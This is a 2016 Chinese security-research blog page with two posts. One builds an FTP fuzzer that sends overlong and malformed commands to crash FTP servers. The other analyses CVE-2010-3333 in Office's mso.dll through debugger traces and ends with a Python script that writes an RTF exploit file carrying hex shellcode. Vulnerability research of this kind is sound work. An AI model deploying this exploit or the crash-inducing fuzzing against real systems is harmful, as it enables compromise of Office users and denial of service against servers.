<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8" />
  
  <title>BootKit&#39;s Blog</title>
  <meta name="author" content="BootKit" />

  

  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

  
  <meta property="og:site_name" content="BootKit&#39;s Blog" />

  
  

  
    <meta property="og:image" content="undefined" />
  

  
  <link href="/css/images/favicon.ico" rel="icon" />
  

  <link rel="alternate" href="/atom.xml" title="BootKit&#39;s Blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  


  <!-- baidu webmaster push -->
  <script src='//push.zhanzhang.baidu.com/push.js'></script>

</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">BootKit&#39;s Blog</a></h1>
  <h2><a href="/">穷尽一生磨利剑            ----BootKit</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">主页</a></li>
    
      <li><a href="/archives">归档</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper">
  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2016-09-27T04:52:58.000Z"><a href="/2016/09/27/DIY个人FTP Fuzzer/">2016-09-27</a></time>
      
      
  
    <h1 class="title"><a href="/2016/09/27/DIY个人FTP Fuzzer/">DIY个人FTP Fuzzer</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="Diy个人ftp-fuzzer"><a href="#Diy个人ftp-fuzzer" class="headerlink" title="Diy个人ftp fuzzer"></a>Diy个人ftp fuzzer</h2><h3 id="0x00介绍"><a href="#0x00介绍" class="headerlink" title="0x00介绍"></a>0x00<strong><em>介绍</em></strong></h3><p>本文旨在通过python以及C#构造用户能够自定义，添加或者修改挖掘规则的ftp fuzzer。<br>现在很多的ftp fuzzer已经由开发者自定义了内部挖掘规则。如果需要加入新的挖掘规则，用户除了自己写一个挖掘器，是否还有其它方法呢？  </p>
<p>实现方式：由ftp fuzzer提供接口，用户按照自己的想法写出相应的挖掘规则。</p>
<p>环境:WIn8 vs2013 + python + ironPython</p>
<h3 id="0x01详概"><a href="#0x01详概" class="headerlink" title="0x01详概"></a>0x01<strong><em>详概</em></strong></h3><p>ftp相关知识这里不介绍，大家可以去看看官方文档。程序整体的界面用c#开发，其中ironPython是为了实现在c#环境下运行python脚本。用python的原因主要基于：1.用户可以专注于挖掘规则的编写，不需要关注界面，以及数据处理问题。2.python简单，快捷，学习进度快。  </p>
<p>在C#中调用python文件需要用到ironPython技术。相关资料读者可自行查阅，这里就不过多介绍了。  </p>
<p>相关的调用方式：</p>
<pre><code>//c#中调用python脚本
using IronPython.Hosting;
.......
ScriptRuntime pyRuntime = Python.CreateRuntime();
dynamic obj = pyRuntime.UseFile(&quot;fuzz.py&quot;); //创建python脚本对象 使用方法：obj.function()
</code></pre><p>fuzz.py文件包含各种测试命令，脏数据，以及规则。这些都可以由用户修改，添加。<br>C#调用fuuz.py文件中的函数向ftp服务器发送各种脏数据。<br>测试之前我们肯定也要看ftp服务是否打开，这里我们用一个简单的函数完成。  </p>
<pre><code>def login(ip, port, username, password):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        connect = s.connect((ip, port))
        s.recv(1024)
        s.send(&quot;user &quot; + username + &quot;\r\n&quot;)
        s.recv(1024)
        s.send(&quot;PASS &quot; + password + &quot;\r\n&quot;)
        s.recv(1024)
        s.close()
        return True;
    except:
        s.close()
        return False;
</code></pre><p>介绍程序之前我们首先看一下当前常用ftp fuzzer是如何对程序进行测试的。  </p>
<pre><code>buffer = 50*&apos;A&apos;
s.send(fuzzcmd[attr] + &quot; &quot; + buffer * 5 + &apos;\r\n&apos;)
s.send(fuzzcmd[attr] + &quot; &quot; + buffer * 20 + &apos;\r\n&apos;)
s.send(fuzzcmd[attr] + &quot; &quot; + buffer * 40 + &apos;\r\n&apos;)
s.send(fuzzcmd[attr] + &quot; &quot; + buffer * 100 + &apos;\r\n&apos;)
s.send(fuzzcmd[attr] + &quot; &quot; + buffer * 200 + &apos;\r\n&apos;)
来源：《0day安全软件漏洞分析技术》
</code></pre><p>fuzzcmd是一个包含ftp命令的数组，如“cd” “dir”等等。</p>
<p>我们定义一个overFuzz()函数，来完成这个功能。</p>
<pre><code>def overFuzz(ip, port, username, password, attr)  
</code></pre><p>按照这种方式，ftp服务器接收到的数据如果造成溢出，程序将直接崩溃掉，程序崩溃掉之后，数据自然是发送不到ftp服务器的，我们可以按照这个依据来判断程序是否含有漏洞。</p>
<pre><code>attr = &quot;标志位&quot; + &quot;脏数据&quot;
</code></pre><p>c#判断attr其中的标志位是否为“true”，如果为“true”,则后面的脏数据则为造成程序崩溃的数据，可以供用户后面分析调试。</p>
<p>可利用的漏洞我们用这种方法测试，而不能利用，只能造成程序异常退出的漏洞我们将采用另外一种规则。在fuzz.py中，我们定义了dDosString[], dDosChar[]两个数组，用户有自己的想法，也完全可以修改这两个变量。测试方式和前面的overfuzz一样。</p>
<p>现在我们用某个ftp服务程序测试一下。这是其中关于ddos的测试效果。</p>
<p><img src="/img/1.jpg" alt="1 icon"></p>
<p><img src="/img/2.jpg" alt="2 icon"></p>
<p>当然这个漏洞不能利用，只能造成程序异常退出。</p>
<p>现在我们再看一下挖掘规则的问题。在fuzz.py文件中，现在我们定义了几个重要的变量。</p>
<pre><code>fuzzcmd[] //包含ftp命令
buffer = 50*&apos;a&apos; 
dDosString[] //例如&apos;%%%n&apos;
dDosChar[] //例如&apos;%&apos;， &apos;\&apos;等
</code></pre><p>这几个变量的值由用户决定。在文章开头，我们说过新的挖掘规则怎么添加？我们完全可以仿照overFuzz这个函数重新写一个，恩，我们试一下。观察一下我们发送数据的格式。 </p>
<pre><code>s.send(fuzzcmd[attr] + &quot; &quot; + buffer * 5 + &apos;\r\n&apos;)
</code></pre><p>发送的数据都是像这样的：</p>
<pre><code>cd aaaaaaaaaaaaaaaaaaaaaaaaa &apos;\r\n&apos;
</code></pre><p>这也是大多数此类fuzz程序通用的格式，现在有一种新的方式，且程序中招率还不低，我测试了市面上大多ftp服务端程序，其中部分程序在处理以下数据的时候，将直接退出。</p>
<pre><code>s.send(fuzzcmd[attr] + &quot; &quot; + buffer * 5) //命令后面加字符串 不添加&apos;\r\n&apos;
s.send(fuzzcmd[attr])                    //命令后面不加字符串 不添加&apos;\r\n&apos;
</code></pre><p>虽然只是后面有没有’\r\n’的问题，但是很多ftp服务端程序依然没有处理此种数据的能力。<br>(其实你也可以尝试把’\r\n’删除，添加或者在两个’\r\n’中添加其它数据，有惊喜！)  </p>
<p>如：  </p>
<pre><code>&apos;cd&apos; + &apos;a&apos;*500 + &apos;\r\n&apos; + &apos;a&apos;*500 + &apos;\r\n&apos; //&apos;\r\n&apos;可以修改成其它类似的数据
</code></pre><h3 id="0x02总结"><a href="#0x02总结" class="headerlink" title="0x02总结"></a>0x02<strong><em>总结</em></strong></h3><p>文章只是介绍了ftp fuzzer的小部分知识，还有很多东西文中都没有提到，包括ftp的基础知识，溢出的相关知识。这些读者都可以自己去查找相关资料，当然，这也不是本文关注的重点。希望大家能够发挥各自脑洞，不要让现有的资料或者规则局限思维方式。在ftp漏洞挖掘中，就我所知道的，挖掘ftp漏洞至少还有一种规则。文章中介绍的fuzzer其貌不全，但是在添加了大多数规则的时候，测试效果还是较好的。大多ftp服务端程序或多或少都有问题。希望大家能在这个简单模型的基础上，打造一个功能强大的ftp fuzzer。</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2016-08-17T15:31:46.000Z"><a href="/2016/08/17/cve-2010-3333分析/">2016-08-17</a></time>
      
      
  
    <h1 class="title"><a href="/2016/08/17/cve-2010-3333分析/">cve-2010-3333分析</a></h1>
  

    </header>
    <div class="entry">
      
        <h3 id="0x00环境"><a href="#0x00环境" class="headerlink" title="0x00环境"></a>0x00环境</h3><hr>
<p>环境：xp sp3<br>虚拟机：vmware<br>调试器：windbg od<br>反汇编器： IDA Pro<br>漏洞软件：office 2013 mso.dll 11.0.8324<br>文件：<a href="http://pan.baidu.com/s/1hr7wpzI" target="_blank" rel="external">http://pan.baidu.com/s/1hr7wpzI</a></p>
<h3 id="0x01文件"><a href="#0x01文件" class="headerlink" title="0x01文件"></a>0x01文件</h3><hr>
<ul>
<li><strong>ofiice exe</strong><br>  版本11.0.8324安装程序。</li>
<li><strong>crash</strong><br>  crash.rtf（metasploit set tartget 6生成的崩溃文件）<br>  crash.md (分析漏洞点)</li>
<li><strong>exploit</strong><br>  ret.md(覆盖返回地址攻击程序)<br>  seh.md(覆盖seh攻击程序)</li>
<li><strong>comparition</strong><br>  v 11.0.8324与v 11.0.8325的mso.dll文件。<br>  compariton.md(利用bindiff比对两个dll文件)</li>
</ul>
<h3 id="0x02漏洞信息"><a href="#0x02漏洞信息" class="headerlink" title="0x02漏洞信息"></a>0x02漏洞信息</h3><hr>
<p><a href="http://cve.scap.org.cn/cve-2010-3333.html" target="_blank" rel="external">http://cve.scap.org.cn/cve-2010-3333.html</a></p>
<h3 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h3><hr>
<p>首先打开WinWord.exe,用windbg附加调试，打开crash.rtf文件。<br><img src="/img/ret.png" alt="ret icon"></p>
<p>我们发现在rep move指令处程序crash掉了，通过查看esi以及edi，我们发现，程序已经复制了一部分数据到edi，至于挂掉的原因，大家可以在windbg中使用 !address edi 查看，发现此时的edi（130000）只能read。  </p>
<p>我们在当前eip 30e97c06 下一个断点。<br><img src="/img/kb.png" alt="ret icon"></p>
<p>看下图，我们知道rep mov 所在的函数是被30f749d2调用的。<br><img src="/img/ub.png" alt="ret icon"></p>
<p>在30f749d2下断点  </p>
<pre><code>....
....
0:000&gt; 
eax=30da4cb0 ebx=05000000 ecx=00123d80 edx=00000000 esi=01491128 edi=00123f48
eip=30f74a05 esp=00123d64 ebp=00123d90 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal2212+0x29da:
30f74a05 895df4          mov     dword ptr [ebp-0Ch],ebx ss:0023:00123d84=b2b95040
0:000&gt; 
eax=30da4cb0 ebx=05000000 ecx=00123d80 edx=00000000 esi=01491128 edi=00123f48
eip=30f74a08 esp=00123d64 ebp=00123d90 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal2212+0x29dd:
30f74a08 ff501c          call    dword ptr [eax+1Ch]  ds:0023:30da4ccc=30e97be0
</code></pre><p>一直跟踪程序，发现到了调用rep mov 所在函数的位置,按F8跟踪函数内部  </p>
<pre><code>eax=01491128 ebx=05000000 ecx=0000c8ac edx=00000000 esi=1104000c edi=00123d80
eip=30e97c01 esp=00123d58 ebp=00123d90 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal1105+0x807:
30e97c01 8bc1            mov     eax,ecx
0:000&gt; 
eax=0000c8ac ebx=05000000 ecx=0000c8ac edx=00000000 esi=1104000c edi=00123d80
eip=30e97c03 esp=00123d58 ebp=00123d90 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal1105+0x809:
30e97c03 c1e902          shr     ecx,2
0:000&gt; 
eax=0000c8ac ebx=05000000 ecx=0000322b edx=00000000 esi=1104000c edi=00123d80
eip=30e97c06 esp=00123d58 ebp=00123d90 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal1105+0x80c:
30e97c06 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
</code></pre><p>注意ecx值，刚开始ecx为c8ac大家可以看，后面因为以Dword方式传送，所以向右移两位。查阅相关资料可以知道这个c8ac就是rtf文件中pFragments第三个参数偏移8位开始的两个字节。</p>
<p>在这个时候我们发现ebp - edi = 0x10  </p>
<p>意思就是说我们只要覆盖0x14字节后既可以覆盖到返回地址，另外关于shellcode的安置，可以通过pattern_create 来找到准确偏移，或者跟踪程序，如：</p>
<pre><code>0:000&gt; 
eax=00000000 ebx=00000000 ecx=e0040057 edx=00000000 esi=00000000 edi=00000000
eip=30f74ac9 esp=00123d7c ebp=00123d90 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal2212+0x2a9e:
30f74ac9 c9              leave
0:000&gt; 
eax=00000000 ebx=00000000 ecx=e0040057 edx=00000000 esi=00000000 edi=00000000
eip=30f74aca esp=00123d94 ebp=00000000 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal2212+0x2a9f:
30f74aca c21400          ret     14h
</code></pre><p>发现程序最后会弹出0x14字节，所以我们在jmp esp后面写上20字节的无用数据就行。</p>
<p>jmp esp方式：</p>
<p>junk + （length of data） + junk(20 bytes) + address of jmp esp + junk(20bytes) + shellcode<br>后续部分下载网盘文件 有更为详细的分析，包括两种方式构造exploit。</p>
<p>覆盖返回地址： </p>
<pre><code>shellcode = &quot;{\\rtf1{\shp{\sp{\sn pFragments}{\sv 5;5;11111111ff05&quot; + \
            &quot;0000000000000000000000000000000000000000&quot; + \
            &quot;2f762600&quot; + \
            &quot;0000000000000000000000000000000000000000&quot; + \
            &quot;31d2b230648b128b520c8b521c8b42&quot; + \
            &quot;088b72208b12807e0c3375f289c703&quot; + \
            &quot;783c8b577801c28b7a2001c731ed8b&quot; + \
            &quot;34af01c645813e4661746175f2817e&quot; + \
            &quot;084578697475e98b7a2401c7668b2c&quot; + \
            &quot;6f8b7a1c01c78b7caffc01c7687974&quot; + \
            &quot;6501686b656e42682042726f89e1fe&quot; + \
            &quot;490b31c05150ffd7}}}}&quot;
f = open(&quot;ret.rtf&quot;,  &quot;a&quot;)
f.write(shellcode)
f.close()
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>






<nav id="pagination">
  
</nav>
</div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="搜索">
    <input type="hidden" name="q" value="site:yoursite.com">
  </form>
</div>

  

  
<div class="widget tag">
  <h3 class="title">最新文章</h3>
  <ul class="entry">
    
      <li>
        <a href="/2016/09/27/DIY个人FTP Fuzzer/">DIY个人FTP Fuzzer</a>
      </li>
    
      <li>
        <a href="/2016/08/17/cve-2010-3333分析/">cve-2010-3333分析</a>
      </li>
    
  </ul>
</div>


  

  
</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  <p>
  
  &copy; 2016 BootKit
  
  All rights reserved.</p>
  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
</div>
<div class="clearfix"></div>

<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
  <script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


<div id='bg'></div>
</body>
</html>